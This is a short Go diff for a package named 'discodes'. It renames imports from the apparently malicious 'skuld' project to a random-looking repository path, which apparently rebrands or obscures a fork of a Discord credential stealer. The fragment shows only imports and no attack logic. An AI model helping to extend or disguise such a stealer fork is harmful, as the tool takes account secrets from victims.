@@ -1,8 +1,8 @@
 package discodes
 
 import (
-	"github.com/hackirby/skuld/utils/hardware"
-	"github.com/hackirby/skuld/utils/requests"
+	"github.com/0xFl4q/1237FHJQSDF1234/utils/hardware"
+	"github.com/0xFl4q/1237FHJQSDF1234/utils/requests"
 	"os"
 	"path/filepath"
 	"strings"
